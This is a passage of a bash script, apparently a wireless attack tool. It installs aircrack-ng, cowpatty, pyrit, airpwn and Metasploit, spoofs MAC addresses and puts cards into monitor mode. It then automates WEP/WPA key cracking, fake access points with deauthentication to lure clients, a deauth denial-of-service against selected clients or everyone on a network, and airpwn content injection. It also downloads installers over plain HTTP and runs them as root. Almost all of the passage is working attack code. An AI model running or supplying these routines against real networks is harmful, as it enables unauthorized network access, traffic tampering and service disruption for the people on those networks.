      else
         display error "Couldn't detect a wireless interface" 1>&2; cleanUp
      fi
   fi

   if [ -e "/sys/class/net/$interface/device/driver" ]; then wifiDriver=$(ls -l "/sys/class/net/$interface/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'); fi
   mac=$(ifconfig $interface | awk '/HWaddr/ {print $5}')
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
             mode=$mode
        wpaMethod=$wpaMethod
      wpaSoftware=$wpaSoftware
         wordlist=$wordlist
              mac=$mac
          macMode=$macMode
          fakeMac=$fakeMac
          keepCap=$keepCap
        capFolder=$capFolder
        benchmark=$benchmark
      diagnostics=$diagnostics
            quiet=$quiet
          verbose=$verbose
            debug=$debug
       wifiDriver=$wifiDriver
               os=$os
   installPackage=$installPackage
     decodeFolder=$decodeFolder
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsusb-----------------------------------" >> $logFile
   lsusb >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmod >> $logFile
   update   # Checks for an update
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ]; then
    display info "        mode=$mode"
#    display info " diagnostics=$diagnostics"
#    display info "       quiet=$quiet"
#    display info "     verbose=$verbose"
#    display info "       debug=$debug"
    display info "          os=$os"
#    display info "installPackage=$installPackage"
    if [ "$mode" == "crack" ] || [ "$mode" == "inject" ] || [ "$mode" == "karma" ] || [ "$mode" == "dos" ]; then display info "   interface=$interface"; fi
    if [ "$mode" == "crack" ] || [ "$mode" == "inject" ] || [ "$mode" == "karma" ] || [ "$mode" == "dos" ]; then display info "  wifiDriver=$wifiDriver"; fi
    if [ "$mode" == "crack" ] || [ "$mode" == "inject" ] || [ "$mode" == "karma" ] || [ "$mode" == "dos" ]; then display info "         mac=$mac"; fi
    if [ "$mode" == "crack" ] || [ "$mode" == "inject" ] || [ "$mode" == "karma" ] || [ "$mode" == "dos" ]; then display info "     macMode=$macMode"; fi
    if ([ "$mode" == "crack" ] || [ "$mode" == "inject" ] || [ "$mode" == "karma" ] || [ "$mode" == "dos" ]) && [ "$macMode" == "set" ]; then display info "     fakeMac=$fakeMac"; fi
    if [ "$mode" == "crack" ]; then display info " wpaSoftware=$wpaSoftware"; fi
    if [ "$mode" == "crack" ]; then display info "   wpaMethod=$wpaMethod"; fi
    if ([ "$mode" == "crack" ] && [ "$wpaMethod" == "wordlist" ]) || [ "$mode" == "wordlist" ]; then display info "    wordlist=$wordlist"; fi
    if [ "$mode" == "crack" ]; then display info "     keepCap=$keepCap"; fi
    if [ "$mode" == "crack" ]; then display info "   capFolder=$capFolder"; fi
    if [ "$mode" == "crack" ]; then display info "   benchmark=$benchmark"; fi
    if [ "$mode" == "crack" ]; then display info "      timeAP=$timeAP"; fi
    if [ "$mode" == "crack" ]; then display info "  timeClient=$timeClient"; fi
    if [ "$mode" == "crack" ]; then display info "     timeWEP=$timeWEP"; fi
    if [ "$mode" == "crack" ]; then display info "     loopWPA=$loopWPA"; fi
    if [ "$mode" == "decode" ]; then display info "decodeFolder=$decodeFolder"; fi
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/bin/xterm" ]; then
   display error "xterm isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ "$REPLY" != *[Nn]* ]]; then action "Installing xterm" "$installPackage xterm"; fi
   if [ ! -e "/usr/bin/xterm" ]; then display error "Failed to install xterm" 1>&2; display info "Enabling: Quiet Mode"; quiet="true";
   else display info "Installed: xterm"; fi
fi
if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ]; then
   display error "aircrack-ng isn't installed" 1>&2
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing aircrack-ng" "$installPackage aircrack-ng && airodump-ng-oui-update"; fi
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ]; then display error "Failed to install aircrack-ng" 1>&2; cleanUp
   else display info "Installed: aircrack-ng"; fi
fi
if [ ! -e "/usr/bin/macchanger" ]; then
   display error "macchanger isn't installed"
   echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
   if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing macchanger" "$installPackage macchanger"; fi
   if [ ! -e "/usr/bin/macchanger" ]; then display error "Failed to install macchanger" 1>&2; cleanUp
   else display info "Installed: macchanger"; fi
fi
if [ "$mode" == "crack" ] || [ "$mode" == "table" ]; then
    if [ "$wpaMethod" == "brute" ]; then
      if [ ! -e "/pentest/passwords/crunch/crunch" ]; then
         display error "crunch isn't installed"
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
         if [[ ! "$REPLY" =~ ^[Nn]$ ]] && [ ! -e "/pentest/passwords/crunch/crunch" ]; then action "Installing crunch" "mkdir -p \"$(pwd)/tmp/\"; wget -O \"$(pwd)/tmp/crunchNEW.tgz\" http://sourceforge.net/projects/crunch-wordlist/files/crunch-wordlist/crunch-2.9.tgz/download && mv \"$(pwd)/tmp/crunchNEW.tgz\" \"$(pwd)/tmp/crunch.tgz\"; wget -O \"$(pwd)/tmp/crunchOLD.tgz\" http://downloads.sourceforge.net/project/crunch-wordlist/crunch-wordlist/OldFiles/crunch2.9.tgz && \"$(pwd)/tmp/crunchOLD.tgz\" \"$(pwd)/tmp/crunch.tgz\"; tar -xvf \"$(pwd)/tmp/crunch.tgz\" -C \"$(pwd)/tmp/\" && cd \"$(pwd)/tmp/crunch2.9\" && make install && rm -rf \"$(pwd)/tmp/crunch2.9.tgz\" /pentest/passwords/crunch/crunch2.9/"; fi
         if [ ! -e "/pentest/passwords/crunch/crunch" ]; then display error "Failed to install crunch" 1>&2; cleanUp
         else display info "Installed: crunch"; fi
      fi
   fi
   if [ "$wpaSoftware" == "cowpatty" ]; then
      if [ ! -e "/usr/bin/cowpatty" ] && [ ! -e "/usr/local/bin/cowpatty" ]; then
         display error "cowpatty isn't installed" 1>&2
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
         if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing cowpatty" "$installPackage cowpatty"; fi
         if [[ ! "$REPLY" =~ ^[Nn]$ ]] && [ ! -e "/usr/local/bin/cowpatty" ]; then action "Installing cowpatty" "wget -P \"$(pwd)/tmp\" http://www.willhackforsushi.com/code/cowpatty/4.3/cowpatty-4.3.tgz && tar -xvf \"$(pwd)/tmp/cowpatty-4.3.tgz\" -C \"$(pwd)/tmp/\" && cd \"$(pwd)/tmp/cowpatty-4.3\" && make && make install"; fi
         if [ ! -e "/usr/bin/cowpatty" ] && [ ! -e "/usr/local/bin/cowpatty" ]; then display error "Failed to install cowpatty" 1>&2; wpaSoftware="aircrack-ng"
         else display info "Installed: cowpatty"; fi
      fi
   elif [ "$wpaSoftware" == "pyrit" ]; then
      if [ ! -e "/usr/bin/pyrit" ] && [ ! -e "/usr/local/bin/pyrit" ]; then
         display error "pyrit isn't installed" 1>&2
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
         if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing pyrit" "$installPackage g++; $installPackage python-dev; $installPackage zlib1g-dev; $installPackage libssl-dev; $installPackage pyrit; $installPackage scapy2"; fi
         if [[ ! "$REPLY" =~ ^[Nn]$ ]] && [ ! -e "/usr/bin/pyrit" ] && [ ! -e "/usr/local/bin/pyrit" ]; then action "Installing pyrit" "wget -P \"$(pwd)/tmp\" https://pyrit.googlecode.com/files/pyrit-0.3.0.tar.gz && tar -xvf \"$(pwd)/tmp/pyrit-0.3.0.tar.gz\" -C \"$(pwd)/tmp/\" && cd \"$(pwd)/tmp/pyrit-0.3.0\" && python setup.py build && python setup.py install"; fi
         if [ ! -e "/usr/bin/pyrit" ] && [ ! -e "/usr/local/bin/pyrit" ]; then display error "Failed to install pyrit" 1>&2; wpaSoftware="aircrack-ng"
         else display info "Installed: pyrit"; fi
      fi
   fi
elif [ "$mode" == "inject" ]; then
   if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ]; then
      display error "airpwn isn't installed"
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
      if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then
         action "Installing airpwn" "$installPackage libnet-devel; $installPackage libnet10-devel; $installPackage pcre; $installPackage libnet1-dev; $installPackage libpcap-dev; $installPackage python2.4-dev; $installPackage libpcre3-dev; $installPackage libssl-dev; $installPackage libreadline5; wget -P \"$(pwd)/tmp\" http://mirror.pnl.gov/ubuntu//pool/main/d/db4.3/libdb4.3_4.3.29-5build1_i386.deb && dpkg -i \"$(pwd)/tmp/libdb4.3_4.3.29-5build1_i386.deb\"; wget -P \"$(pwd)/tmp\" http://security.ubuntu.com/ubuntu/pool/main/p/python2.4/python2.4-minimal_2.4.3-0ubuntu6.4_i386.deb && dpkg -i \"$(pwd)/tmp/python2.4-minimal_2.4.3-0ubuntu6.4_i386.deb\"; wget -P \"$(pwd)/tmp\" http://security.ubuntu.com/ubuntu/pool/main/p/python2.4/python2.4_2.4.3-0ubuntu6.4_i386.deb && dpkg -i \"$(pwd)/tmp/python2.4_2.4.3-0ubuntu6.4_i386.deb\"; wget -P \"$(pwd)/tmp\" http://security.ubuntu.com/ubuntu/pool/main/p/python2.4/python2.4-dev_2.4.3-0ubuntu6.4_i386.deb && dpkg -i \"$(pwd)/tmp/python2.4-dev_2.4.3-0ubuntu6.4_i386.deb\"; wget -P \"$(pwd)/tmp\" http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && mkdir -p /pentest/wireless && tar -C /pentest/wireless -xvf \"$(pwd)/tmp/airpwn-1.4.tgz\" && rm \"$(pwd)/tmp/airpwn-1.4.tgz\""
         find="#ifndef _LINUX_WIRELESS_H"
         replace="#include <linux\/if.h>"
         sed "s/$replace//g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new" # remove if its already there
         sed "s/$find/$replace\n$find/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
         rm -f "/usr/include/linux/wireless.h.new"
         action "Installing airpwn" "tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd /pentest/wireless/airpwn-1.4 && ./configure && make"
      fi
      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ]; then display error "Failed to install airpwn" 1>&2; cleanUp
      else display info "Installed: airpwn"; fi
   fi
elif [ "$mode" == "karma" ]; then
   if [ ! -e "/opt/metasploit3/bin/msfconsole" ] && [ ! -e "/opt/framework-3.5.1/msf3/msfconsole" ]; then
      display error "Metasploit isn't installed" 1>&2
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
      if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing metasploit" "$installPackage framework3"; fi
      if [[ ! "$REPLY" =~ ^[Nn]$ ]] && [ ! -e "/opt/metasploit3/bin/msfconsole" ]; then action "Installing metasploit" "wget -P \"$(pwd)/tmp\" http://updates.metasploit.com/data/releases/framework-3.5.1-linux-i686.run && chmod +x \"$(pwd)/tmp/framework-3.5.1-linux-i686.run\" && \"$(pwd)/tmp/framework-3.5.1-linux-i686.run\""; fi #--mode text
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] && [ ! -e "/opt/framework-3.5.1/msf3/msfconsole" ]; then display error "Failed to install metasploit" 1>&2; cleanUp
      else display info "Installed: metasploit"; fi
   fi
   if [ ! -e "/usr/sbin/dhcpd3" ] && [ ! -e "/usr/sbin/dhcpd" ]; then
      display error "dhcpd3 isn't installed" 1>&2
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Would you like to try and install it? [Y/n]: "
      if [[ ! "$REPLY" =~ ^[Nn]$ ]]; then action "Installing dhcpd3" "$installPackage dhcp3-server; update-rc.d -f dhcpd3 remove"; fi
      if [[ ! "$REPLY" =~ ^[Nn]$ ]] && [ ! -e "/usr/sbin/dhcpd3" ] && [ ! -e "/usr/sbin/dhcpd" ]; then action "Installing dhcpd3" "$installPackage dhcp; update-rc.d -f dhcpd3 remove"; fi
      if [ ! -e "/usr/sbin/dhcpd3" ] && [ ! -e "/usr/sbin/dhcpd" ]; then display error "Failed to install dhcpd3" 1>&2; cleanUp
      else display info "Installed: dhcpd3"; fi
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
cleanUp remove
mkdir -p "$(pwd)/tmp/"
if [ "$mode" == "crack" ] && [ "$keepCap" == "true" ]; then mkdir -p "$capFolder"
elif [ "$mode" == "decode" ]; then mkdir -p "${decodeFolder%*.cap}"
elif [ "$mode" == "table" ]; then mkdir -p "$(pwd)/table/"
elif [ "$mode" == "karma" ]; then mkdir -p "$(pwd)/karma/"; fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "decode" ] && [ "$mode" != "table" ] && [ "$mode" != "wordlist" ]; then
   if [ "$displayMore" == "true" ]; then display more "Stopping: Programs"; fi
   command="service network-manager stop 2>/dev/null; "
   if [ -e "/etc/init.d/wicd" ]; then command="$command /etc/init.d/wicd stop 2>/dev/null"; fi
   action "Starting services" "$command"      # Backtrack & Ubuntu
   tmp=$(ps aux | grep "$interface" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}') #function checkIfRunning
   if [ -n "$tmp" ]; then command="$command kill $tmp;"; fi    # to prevent interference
   command="$command killall -9 aircrack-ng cowpatty pyrit airbase-ng wicd-client airodump-ng wpa_action wpa_supplicant wpa_cli dhclient ifplugd dhcdbd dhcpcd NetworkManager knetworkmanager avahi-autoipd avahi-daemon wlassistant wifibox" # Killing "wicd-client" to prevent channel hopping
   action "Killing programs" "$command"
   if [ "$(pgrep xterm)" ]; then killall -9 xterm; fi    # Cleans up any running xterms.

   #----------------------------------------------------------------------------------------------#
   action "Refreshing interface" "ifconfig $interface down; ifconfig $interface up; sleep 1"

   #----------------------------------------------------------------------------------------------#
   if [ "$wifiDriver" == "rtl8187" ] || [ "$wifiDriver" == "r8187" ]; then action "Changing drivers" "rmmod r8187 rtl8187 mac80211; rfkill block all; rfkill unblock all; modprobe rtl8187; rfkill unblock all; ifconfig $interface up"; fi

   #----------------------------------------------------------------------------------------------#
   if [ "$displayMore" == "true" ]; then display more "Configuring: Wireless card"; fi
   monitorInterface=$(iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)

   if [ -z "$monitorInterface" ]; then
      action "Monitor Mode (Starting)" "airmon-ng start $interface | tee \"$(pwd)/tmp/wiffy.tmp\""
      monitorInterface=$(iwconfig 2> /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
   fi

   if [ -z "$monitorInterface" ]; then display error "Couldn't detect monitorInterface" 1>&2; cleanUp;
   else if [ "$displayMore" == "true" ]; then display more "monitorInterface=$monitorInterface"; fi; fi

   #----------------------------------------------------------------------------------------------#
   if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
      display diag "Testing: Wireless Injection"
      command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
      if [ "$diagnostics" == "true" ]; then echo -e "$command" >> $logFile; fi
      if [ -z "$(echo \"$command\" | grep \"Injection is working\")" ]; then display error "$monitorInterface doesn't support packet injecting [1]" 1>&2
      elif [ -z "$(echo \"$command\" | grep \"Found 0 APs\")" ]; then display error "Couldn't test packet injection" 1>&2;
      fi
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$macMode" == "random" ] || [ "$macMode" == "set" ]; then
      if [ "$displayMore" == "true" ]; then display more "Configuring: MAC address"; fi
      command="ifconfig $monitorInterface down;"
      if [ "$macMode" == "random" ]; then command="$command macchanger -A $monitorInterface 2>&1 /dev/null;"
      elif [ "$macMode" == "set" ]; then command="$command macchanger -m $fakeMac $monitorInterface 2>&1 /dev/null;"; fi
      command="$command ifconfig $monitorInterface up"
      action "Configuring MAC" "$command"
   fi

   command=$(macchanger --show $monitorInterface)
   mac=$(echo $command | awk -F " " '{print $3}')
   macType=$(echo $command | awk -F "Current MAC: " '{print $2}')
   if [ "$displayMore" == "true" ]; then display more "mac=$macType"; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "crack" ]; then
   while [ "$stage" != "done" ]; do
      while [ "$stage" != "done" ]; do
         findAP # Select an AP
         #----------------------------------------------------------------------------------------------#
         if [ "$attackMethod" == "ap" ] && [ "$crackMethod" == "online" ]; then
            for ((z=0; z<${#bssid[@]}; z++)); do
               _essid="${essid[${z}]}"; _bssid="${bssid[${z}]}"; _encryption="${encryption[${z}]}"; _channel="${channel[${z}]}"  # Fixes value, else I *might* changed and upset bssid array
               if [ "$stage" != "interrupt" ]; then setup "$_essid" "$_bssid" "$_encryption" "$_channel"; fi                      # Display AP details & configures for attack # Doesn't check for stage due to loop
               if [ "$stage" == "setup" ]; then checkDB "$_essid" "$_bssid" "$_encryption" "true"; fi                             # Searchs database to see if we have cracked it before
               if [ "$stage" == "checkDB" ] && [ "${#bssid[@]}" -gt "1" ]; then capture "$_bssid" "$_channel" "${#bssid[@]}" "$z"  # Start capturing data
               elif [ "$stage" == "checkDB" ]; then capture "$_bssid" "$_channel"; fi                                             # Start capturing data
               if [ "$stage" == "capture" ]; then findClient "$_essid" "$_bssid" "$_encryption"; fi                               # Search for client
               if [ "$_encryption" == "WEP" ]; then
                  if [ "$stage" == "findClient" ]; then attackWEP "$_essid" "$_bssid"; fi                                         # Attack & crack it (WEP)
                  #if [ "$stage" == "done" ]; then moveCap "$_essid" "$_bssid" "$_encryption"; fi                                 # Once its cracked, move it
               elif [[ "$encryption" == *WPA* ]]; then
                  if [ "$stage" == "findClient" ]; then attackWPA  "$_essid" "$_bssid"; fi                                        # Attack it (WPA/WPA2)
                  if [ "$stage" == "attack" ]; then moveCap "$_essid" "$_bssid" "$_encryption"; fi                                # Move cap/handshake
                  if [ "$stage" == "moveCap" ]; then crackKey "$_essid" "$_bssid" "$_encryption"; fi                              # Then crack it
               fi
            done; essid=""; bssid=""; id=""; encryption=""; client=""; #stage="done"                                          # Reset values and quit;)
         #----------------------------------------------------------------------------------------------#
         elif [ "$attackMethod" == "ap" ] && [ "$crackMethod" == "offline" ]; then
            if [ "$wpaSoftware" == "cowpatty" ]; then display error "$wpasoftware isn't compatible with this mode. Switching to: aircrack-ng" 1>&2; wpaSoftware="aircrack-ng"; fi
            tmp="$(basename $pathCap)"; bssid="$(echo $tmp | sed 's/^.*\-//' | sed 's/\.[^\.]*$//')"; encryption="${tmp%%-*}"
            if [ "$encryption" == "WEP" ] &&  [ "$wpaMethod" == "brute" ]; then display error "WEP doesn't (YET) support brute attack" 1>&2; display info "Switching to: Wordlist"; wpaMethod="wordlist"; fi #***
            crackKey "" "$bssid" "$encryption"
         #----------------------------------------------------------------------------------------------#
         elif [ "$attackMethod" == "apless" ] || [ "$attackMethod" == "clone" ]; then
            if [ "$stage" == "findAP" ]; then setup "$essid" "$bssid" "$encryption" "$channel"; fi
            if [ "$stage" == "setup" ]; then checkDB "$essid" "$bssid" "$encryption" "true"; fi
            if [ "$stage" == "checkDB" ]; then capture "$bssid" "$channel"; fi
            if [ "$stage" == "capture" ]; then attack "FakeAP" "$essid" "$bssid" "$encryption" "$channel"; fi
            if [ "$stage" == "capture" ]; then attack "DeAuth" "$essid" "$bssid"; fi # Kick them - give them a reason to join
            if [ "$encryption" == "WEP" ]; then
               loop="0" # 0 = First Run, 1,2 = Different WEP attacks
               while [ "$stage" != "done" ]; do # Keep restarting (airbase-ng attack issue)
                  if [ "$stage" == "capture" ]; then sleep 60; fi
                  if [ "$stage" == "capture" ]; then action "Restarting airbase-ng" "killall airbase-ng; sleep 1"; fi
                  if [ "$stage" == "capture" ] && [ "$loop" == "0" ]; then loop="1"
                  elif [ "$stage" == "capture" ] && [ "$loop" == "1" ]; then attack "FakeAP" "$essid" "$bssid" "WEP1" "$channel"; loop="2"
                  elif [ "$stage" == "capture" ]; then attack "FakeAP" "$essid" "$bssid" "WEP2" "$channel"; loop="1"; fi
                  if [ "$stage" == "capture" ]; then attack "DeAuth" "$essid" "$bssid"; fi
                  if [ "$stage" == "capture" ]; then sleep 30; fi
                  command=$(ps aux | grep "aircrack-ng" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}') #function checkIfRunning
                  if [ "$stage" == "capture" ] && [ -z "$command" ]; then crackKey "$essid" "$bssid" "$encryption"; fi
               done
               if [ "$stage" == "done" ]; then moveCap "$essid" "$bssid" "$encryption"; fi # WEP - we can only move it after we have cracked it
               if [ "$stage" == "moveCap" ]; then stage="done"; fi # Other wise it loops
            elif [[ "$encryption" == *WPA* ]]; then
               echo "g0tmi1k" > "$(pwd)/tmp/wiffy.tmp"
               #loop="0"
               while [ "$stage" != "attack" ]; do
                  #if [ "$stage" == "capture" ] || [ "$stage" == "findClient" ]; then sleep 10; fi
                  #if [ "$id" != "manual" ] && ([ "$stage" == "capture" ] || [ "$stage" == "findClient" ]); then
                     #if [ "$loop" == "0" ]; then
                     #   findClient "$essid" "$bssid" "WPA"
                     #   for targets in "${client[@]}"; do if [ "$stage" == "findClient" ]; then attack "DeAuth" "$essid" "$bssid" "$targets"; fi; done
                     #   loop="1"
                     #else
                     #   attack "DeAuth" "$essid" "$bssid"
                     #   loop="0"
                     #fi
                  #fi
                  if [ "$id" != "manual" ] && ([ "$stage" == "capture" ] || [ "$stage" == "findClient" ]); then sleep 5; fi
                  if [ "$stage" == "capture" ] || [ "$stage" == "findClient" ]; then action "aircrack-ng" "aircrack-ng \"$(pwd)/tmp/wiffy-01.cap\" -w $(pwd)/tmp/wiffy.tmp -e \"$essid\" | tee $(pwd)/tmp/wiffy.handshake" "true" "0|195|5"; fi
                  command=$(grep "Passphrase not in dictionary" "$(pwd)/tmp/wiffy.handshake"); if [ "$command" ]; then stage="attack"; fi
               done
               if [ "$stage" == "attack" ] && [ "$displayMore" == "true" ]; then display more "Captured: Handshake"; fi
               if [ "$stage" == "attack" ]; then action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm; sleep 1"; fi
               if [ "$stage" == "attack" ]; then moveCap "$essid" "$bssid" "$encryption"; fi
               if [ "$stage" == "moveCap" ]; then crackKey "$essid" "$bssid" "$encryption"; fi
            fi
         fi
      done
   done
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "dos" ]; then
   findAP   # Find all APs
   while true; do # Action loop
      capture "$bssid" "$channel"    # Finds details about that AP
      findClient "$essid" "$bssid" "$encryption"   # Finds clients
      action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"   # Make sure nothing is running

      s="\e[01;35m"; n="\e[00m"
      while true; do # Menu loop
         loop=${#client[@]}
         echo -e " Num |         MAC       \n-----|-------------------"
         if [ ${client[0]} == "clientless" ]; then
            printf "  %-2s | %-16s \n" "1" "  ***EVERYONE***"; i="-1"
            tmp="[-] Select ["$s"a"$n"]nother network, re["$s"s"$n"]scan clients"; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"]"; fi
            echo -e $tmp
         else
            for ((i=0; i<$loop; i++)); do
               printf "  %-2s | %-16s \n" "$(($i+1))" "${client[${i}]}"
            done
            printf "  %-2s | %-16s \n" "$(($i+1))" " *All the above*" "$(($i+2))" "  ***EVERYONE***"
            tmp="[-] Select ["$s"a"$n"]nother network, re["$s"s"$n"]scan clients"; if [ "$i" -gt 0 ]; then tmp="$tmp num ["$s"1"$n"-"$s"$(($i+2))"$n"]"; fi
            echo -e $tmp
         fi

         while true; do # Menu selection loop
            echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
            if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
            elif [[ "$REPLY" =~ ^[Ss]$ ]]; then essid=""; bssid=""; break 2;
            elif [[ "$REPLY" =~ ^[Aa]$ ]]; then essid=""; bssid=""; findAP; break 2;
            elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ]; then display error "Bad input" 1>&2
            elif [ "${client[0]}" == "clientless" ] && [ "$REPLY" != "1" ]; then display error "Incorrect number" 1>&2
            elif [ "${client[0]}" != "clientless" ] && ([ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$(($loop+2))" ]); then display error "Incorrect number" 1>&2
            else id="$(($REPLY-1))"; break; fi
          done

         #----------------------------------------------------------------------------------------------#
         if [ "$bssid" ]; then
            display action "Attack (DoS): $essid"
            if [ "${client[0]}" == "clientless" ] || [ "$REPLY" == $(($loop+2)) ]; then attack "DoS" "$essid" "$bssid" & sleep 1 # Everyone
            elif [ "$REPLY" == $(($loop+1)) ]; then i="0"; for targets in "${client[@]}"; do attack "DoS" "$essid" "$bssid" "$targets" "$i" & sleep 1; i=$((i+90)); done
            else attack "DoS" "$essid" "$bssid" "${client[${id}]}" & sleep 1; fi # Selected client

            display info "Attacking! ...press CTRL+C to stop"
            if [ "$diagnostics" == "true" ]; then echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile; fi
            while [ "$(pgrep aireplay-ng)" ]; do
               sleep 1
            done
         fi
      done
   done
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "inject" ]; then
   command="wlan-ng hostap airjack prism54 madwifing madwifiold rtl8180 rt2570 rt2500 rt73 rt61 zd1211rw bcm43xx mac80211"
   if [[ "$command" != "$wifiDriver" ]]; then display error "$interface's WiFi Driver ($wifiDriver) isn't support by airpwn" 1>&2; display info "Switching to: Manual mode"
      i="0"; s="\e[01;35m"; n="\e[00m"
      echo -e "--------------------\n| Num |   Driver   |\n|-----|------------|"
      for tmp in $command; do
         printf "|  %-2s | %-10s |\n" "$(($i+1))" "$tmp"
         driver[${i}]="$tmp"
         i=$((i+1))
      done
      echo -e "--------------------\n[-] Num ["$s"1"$n"-"$s"$i"$n"]"
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
         elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "$((i+1))" ]; then break; fi
      done
      wifiDriver="${driver[$((REPLY-1))]}"
   fi

   if [ -e "wiffy.keys" ]; then
      index="-1" # so its starts at 0
      while read line; do
         match=$(echo ${line%%:*} | tr -d " ")
         value="${line#*: }"
         case $match in
            ESSID)      index=$(($index+1)); dbESSID[$index]=$value;;
            BSSID)      dbBSSID[$index]=$value;;
            Encryption) dbEncr[$index]=$value;;
            Key)        dbKey[$index]=$value;;
         esac
      done < "$(pwd)/wiffy.keys"

      index="0"
      echo -e "-----------------------------------------------------------------------------------------------\n| Num |              ESSID               |       BSSID       |               Key              |\n|-----|----------------------------------|-------------------|--------------------------------|"
      for ((i=0; i<${#dbESSID[@]}; i++)); do
          if [ "${dbEncr[${i}]}" == "WEP" ]; then
             index=$(($index+1))
             key="${dbKey[${i}]}"
             printf "|  %-2s | %-32s | %-16s | %-30s |\n" "$index" "${dbESSID[${i}]}" "${dbBSSID[${i}]}" "$key"
             injectKey[$index]="${dbKey[${i}]}"
          fi
      done
      s="\e[01;35m"; n="\e[00m"
      tmp="-----------------------------------------------------------------------------------------------\n[-] ["$s"O"$n"]pen WiFi\n[-] ["$s"M"$n"]anual WEP"; if [ "$index" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$index"$n"]"; fi
      echo -e $tmp

      id=""
      while [ -z $id ]; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
         elif [[ "$REPLY" =~ ^[Mm]$ ]]; then type="WEP"; break
         elif [[ "$REPLY" =~ ^[Oo]$ ]]; then type="Open"; break
         elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "$((index+1))" ]; then type="WEP"; id=$REPLY; fi
      done
      if [ "$id" ] && [ "$type" == "WEP" ]; then key="${injectKey[$id]}"
      elif [ "$type" == "WEP" ]; then
         while [ -z "$essid" ]; do
            echo -ne "\e[00;33m[~]\e[00m "; read -p "What is the WEP Key (in hex)?: "
            key="$REPLY"
         done
      fi
   fi

   if [ "$type" == "Open" ]; then
      display action "Attack (Inject): Open Networks"
      action "AirPWN" "cd /pentest/wireless/airpwn-1.4/ && ./airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvv" "true" "0|0|40" & #-vvvv #-i inputCard -o outputCard
   elif [ "$type" == "WEP" ]; then
      echo $key
      key=$(echo $key | sed -e 's/[0-9A-F]\{2\}/&:/g' -e 's/:$//')
      display action "Attack (Inject): WEP Networks"
      action "AirPWN" "cd /pentest/wireless/airpwn-1.4/ && ./airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvv -F -k $key" "true" "0|0|40" & #-vvvv
   fi

   #iwconfig $monitorInterface channel $channel

   #iwpriv $inCard monitor 2 $channel
   #iwpriv $outCard hostapd 1
   #iwconfig $outCard mode master channel $channel essid $essid
